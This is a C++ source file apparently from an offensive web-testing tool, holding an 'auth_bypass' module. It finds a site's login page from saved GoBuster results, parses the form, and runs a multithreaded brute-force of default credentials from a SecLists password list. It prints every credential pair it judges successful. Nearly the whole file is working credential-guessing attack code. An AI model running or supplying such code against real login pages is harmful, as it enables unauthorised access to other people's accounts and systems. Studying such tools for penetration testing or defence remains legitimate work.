#include "../../include/exploit/auth_bypass.h"
// [TODO:] if there is a segmentation fault look for vector in function "thread function"
std::vector<std::string> credentials;
static std::vector<std::string> authorising_tokens {
					"bad","invalid","credential","match","failed","incorrect"
};

bool response_filter(std::string &response){
	bool return_value = false;
	string_tolower(response);
	for(size_t i = 0; i < authorising_tokens.size(); i++){
		if(response.find(authorising_tokens[i]) != std::string::npos)
			return_value =  true;
	}
	return return_value;
}

void getLoginPath(std::string &hostname, std::string &login_path){
	std::ifstream fin;
	std::string line,filename = Save_LOCATION;
	filename += hostname + FILE_EXTENSION;
	std::string login_page = "login", signin_page = "signin";
	fin.open(filename);
	int begin, flag = 0;
	if (!fin.is_open()){
		print ("Host has no file saved or not collected any data from information step",3);
		return;
	}
	while(std::getline(fin, line)){
		if(line == ">>>> GoBuster Results "){
			flag = 1;
		}
		else if(line == "<<<<" && flag == 1)
			break;
		else if (flag == 1){
			begin = line.find(" (");
			line.replace(begin, (int) line.size(), "");
			if(line.find(signin_page) != std::string::npos){
				login_path = line;
				break;
			}
			else if(line.find(login_page) != std::string::npos){
					login_path = line;
					break;
			}
		}
	}
}

void get_data_field(std::string &data,std::vector<std::string> &response_vector, std::vector<std::string> &credential,
						bool request_type, std::string &extra_data){
	try{
		size_t i;
		if(!request_type) data += "?";
		for (i = 0;i < response_vector.size(); i++)
			data += response_vector[i] + "=" + credential[i] + "&";
		data += extra_data;
	}
	catch (const std::out_of_range & ex)
	{
	    std::cout << "out_of_range Exception Caught :: " << ex.what() << NEW_LINE;
	}
	catch(...){
		std::cout <<"Get data field error" << NEW_LINE;
	}
}
inline void print_auth_bypass(std::string &message, pthread_mutex_t &lock, int COLOR){
	pthread_mutex_lock(&lock);
	print(message, COLOR);
	pthread_mutex_unlock(&lock);
}
void *thread_brute(void *thread_data){
	std::vector<std::string> credential;
	credential.clear();
	struct thread_data *this_thread_data;
	std::string response, print_message, credentials_string;
	std::string data;
	int status_code;
	Sock *login_sock;
	this_thread_data = (struct thread_data *) thread_data;

	while(1){
		credential.clear();
		data.clear();
		pthread_mutex_lock(&this_thread_data->lock);
		if(credentials.empty()){
			print ("Credentials Exhausted Breaking", 5);
			pthread_mutex_unlock(&this_thread_data->lock);
			break;
		}
		credentials_string = credentials.back();
		credentials.pop_back();
		pthread_mutex_unlock(&this_thread_data->lock);

		split_string(credentials_string, credential,":");
		login_sock = new Sock(this_thread_data->hostname,this_thread_data->PORT_NUMBER);
		if(this_thread_data->form_type){
			get_data_field(data, this_thread_data->response_vector,credential, this_thread_data->form_type, this_thread_data->token);
			login_sock->POST_sendrequest(this_thread_data->path, response, data.c_str());
		}
		else{
			data = this_thread_data->path;
			get_data_field(data, this_thread_data->response_vector,credential, this_thread_data->form_type, this_thread_data->token);
			login_sock->sendrequest(this_thread_data->path, response);
		}
		if (response.size() > 0){
			status_code = std::stoi(response.substr(9,3));

			if (status_code != 200){
				if (!response_filter(response)) {
					print_message = "Login successful with credentials ::" + credential[0] + ":" + credential[1];
					print_auth_bypass(print_message, this_thread_data->lock, 2);
				} }
				else{
					print_message = "HTML Header Error!!";
					print_auth_bypass (print_message,this_thread_data->lock, 1);
				}
		}
		else {  print_message = "No response From server";
			   print_auth_bypass(print_message, this_thread_data->lock, 4); }
	}

	pthread_exit(NULL);
}

void login_bypass(std::string &hostname, int PORT_NUMBER, int THREADS){
	/*Use this format for login if user want to use proxy*/
	std::string form_action,extra_data = "", data = "",login_path = "";
	std::vector<std::string> response_vector,temp_creds = {"a","a"};

	response_vector.clear();
	credentials.clear();               // Data clearing

	bool has_input_field = false;
	int status_code, form_type = 0;
	getLoginPath(hostname, login_path);

	if (login_path.size() < 1){
		print("No login page found or data not found for this site try entering a manual path",1);
	}

	std::string response,headers,h_name = "127.0.0.1";
	Sock *login_sock = new Sock(hostname,PORT_NUMBER);
	login_sock->sendrequest(login_path,response);
	search_for_input_field(response,response_vector,has_input_field,form_type, form_action);
	login_path = form_action;
	size_t pop_values = 0 ,vector_size = response_vector.size();

	if(vector_size >= 6) pop_values = 4;
	else if(vector_size >= 4) pop_values = 2;

	for(size_t i = vector_size - 1; i > vector_size - pop_values; i =  i-2){
		extra_data += response_vector[i - 1] + "=" + response_vector[i] + "&";
		response_vector.pop_back();
		response_vector.pop_back();
	}
	if(pop_values) extra_data.pop_back();

	if(!has_input_field) return;
	login_sock = new Sock(hostname, PORT_NUMBER);

	if(form_type){ // For post request
		get_data_field(data, response_vector,temp_creds, form_type,extra_data);
		login_sock->POST_sendrequest(login_path, response, data.c_str());
		if (response.size() > 0){
		status_code = std::stoi(response.substr(9,3));
			if (status_code != 200){
					get_authorising_token(response);
					//authorised_token = response;
				}
		}
		else{
			print ("No response From server");
		}
	}
	else{ // get request
		data = login_path;
		get_data_field(data, response_vector,temp_creds, form_type, extra_data);
		login_sock->sendrequest(data, response);
		if (response.size() > 0){
			status_code = std::stoi(response.substr(9,3));
			if (status_code / 100 == 2){
				get_authorising_token(response);
				//authorised_token = response;
			}
		}
		else{
			print ("No response From server");
		}
	}
	int rc;
	struct thread_data td[THREADS];
	pthread_t threads[THREADS];
	pthread_mutex_t lock;

	if (pthread_mutex_init(&lock, NULL) != 0) {
	     print("Mutex init failed", 1);
	     return;
	}
	std::string line;
	line.clear();
	std::ifstream fout;
	fout.open("/usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt");
	if (!fout.is_open()){
		print ("Credentials file error",1);
		return;
	}
	while(std::getline(fout,line)){
			credentials.push_back(line);
	}
	print("Performing Password Bruet-force with default creds on.." +login_path ,6);

	for (int i = 0; i < THREADS; i++) {
	td[i].thread_id = i;
	td[i].hostname = hostname;
	td[i].PORT_NUMBER = PORT_NUMBER;
	td[i].path = login_path;
	td[i].lock = lock;
	td[i].response_vector = response_vector;
	td[i].form_type = form_type;
	td[i].token = extra_data;

	rc = pthread_create(&threads[i], NULL, thread_brute, (void *)&td[i]);
	if (rc)
		      print("Error:unable to create thread " + std::to_string(rc),1);
	}
	for (int i = 0; i < THREADS; i++)
			pthread_join(threads[i], NULL);

	pthread_mutex_destroy(&lock);
	pthread_exit(NULL);
}
